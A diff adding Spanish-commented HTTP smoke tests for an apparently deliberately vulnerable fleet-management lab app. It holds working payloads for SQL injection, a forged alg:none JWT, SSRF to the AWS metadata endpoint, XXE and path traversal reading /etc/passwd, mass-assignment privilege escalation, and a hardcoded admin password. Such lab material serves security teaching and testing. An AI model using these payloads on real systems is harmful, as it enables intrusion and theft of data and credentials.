@@ -1,0 +1,106 @@
+### ──────────────────────────────────────────────────────────────────────────
+### FleetSec Vulnerable App — Smoke tests de los 10 vectores (V01-V10)
+###
+### Uso: levantar la app (docker compose -f app/docker-compose.yml up -d) y
+### ejecutar cada request. Cada uno DEBE demostrar el vector correspondiente.
+### Compatible con la extensión REST Client de VS Code (@host variable).
+### ──────────────────────────────────────────────────────────────────────────
+
+@host = http://localhost:8080
+
+### ── V01 · SQL Injection (CWE-89) ────────────────────────────────────────────
+### Payload que rompe la cláusula LIKE y fuerza TRUE → devuelve TODOS los conductores
+### (incluida PII de todos), no solo los que matchean el término.
+GET {{host}}/api/drivers/search?q=%27%20OR%20%271%27%3D%271
+
+### Baseline legítimo (para contraste): búsqueda normal
+GET {{host}}/api/drivers/search?q=Gomez
+
+### ── V02 · JWT alg:none (CWE-345) ────────────────────────────────────────────
+### Token forjado con "alg":"none" y sin firma, reclamando sub=admin role=ADMIN.
+### header  = {"alg":"none","typ":"JWT"}                         -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+### payload = {"sub":"admin","role":"ADMIN"}                     -> eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9
+### La app debe responder valid=true, sub=admin, role=ADMIN (sesión suplantada).
+POST {{host}}/api/auth/validate
+Content-Type: application/json
+
+{
+  "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9."
+}
+
+### ── V03 · SSRF (CWE-918) ────────────────────────────────────────────────────
+### La app hace la request server-side al destino provisto: IMDS de AWS.
+### En un entorno EC2 devolvería el listado de roles / credenciales temporales.
+### (Fuera de EC2 da timeout/BAD_GATEWAY, lo que igual prueba que NO valida el destino.)
+POST {{host}}/api/vehicles/1/webhook
+Content-Type: application/json
+
+{
+  "url": "http://169.254.169.254/latest/meta-data/"
+}
+
+### V03 · variante verificable localmente: el server alcanza un servicio interno
+### (su propio api-docs vía localhost del contenedor) y devuelve la respuesta → status 200.
+POST {{host}}/api/vehicles/1/webhook
+Content-Type: application/json
+
+{
+  "url": "http://localhost:8080/v3/api-docs"
+}
+
+### ── V04 · XXE (CWE-611) ─────────────────────────────────────────────────────
+### Entidad externa que lee un archivo local del contenedor y lo exfiltra en la respuesta.
+POST {{host}}/api/vehicles/import
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE fleet [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<fleet>&xxe;</fleet>
+
+### ── V05 · Mass Assignment (CWE-915) ─────────────────────────────────────────
+### El conductor cgomez (id=2, role=DRIVER) escala a ADMIN inyectando "role" en el body.
+PATCH {{host}}/api/drivers/2
+Content-Type: application/json
+
+{
+  "phone": "+57 3000000000",
+  "role": "ADMIN"
+}
+
+### ── V06 · Path Traversal (CWE-22) ───────────────────────────────────────────
+### Escapa del directorio de reportes para leer un archivo del sistema.
+GET {{host}}/api/reports/download?file=../../../../../../etc/passwd
+
+### Baseline legítimo (para contraste): descarga de un reporte válido
+GET {{host}}/api/reports/download?file=reporte-flota-2026-06.txt
+
+### ── V07 · Missing Rate Limiting (CWE-307) ───────────────────────────────────
+### Login con credenciales inválidas — repetir N veces NO produce lockout ni backoff.
+### (En CI/PoC se ejecuta en bucle; aquí una muestra individual.)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "intento-fallido"
+}
+
+### ── V08 · Logging de PII (CWE-359 / Ley 1581) ───────────────────────────────
+### Cualquier búsqueda registra cédula/email/teléfono en texto plano en logs/fleetsec-app.log.
+### Evidencia: docker exec fleetsec-vulnerable-app cat /app/logs/fleetsec-app.log
+GET {{host}}/api/drivers/search?q=Ana
+
+### ── V09 · IDOR (CWE-639) ────────────────────────────────────────────────────
+### Acceso a los viajes de otro conductor cambiando el id, sin verificación de ownership.
+### id=2 (cgomez) tiene viajes sembrados → devuelve datos de otro usuario.
+GET {{host}}/api/drivers/2/trips
+
+### ── V10 · Hardcoded Credentials (CWE-798) ───────────────────────────────────
+### Login usando las credenciales de admin hardcoded en application.yml → token ADMIN.
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "FleetS3c@dm1n-2026!"
+}
